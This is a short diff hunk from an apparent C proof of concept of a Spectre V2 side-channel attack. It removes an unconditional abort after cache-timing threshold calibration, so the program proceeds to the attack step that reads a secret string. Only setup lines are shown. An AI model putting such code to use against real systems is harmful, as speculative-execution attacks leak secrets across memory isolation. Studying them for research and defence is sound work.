@@ -116,11 +116,7 @@ int main() {
 
     // 2. 校准阈值
     uint64_t threshold = measure_access_time();
-    {
-        fprintf(stderr, "Failed to calibrate threshold. Aborting.\n");
-        restore_cpu();
-        return 1;
-    }
+
     // 3. 执行 Spectre V2 攻击
     memset(array, 1, 256 * STRIDE);
     size_t secret_len = strlen(secret);
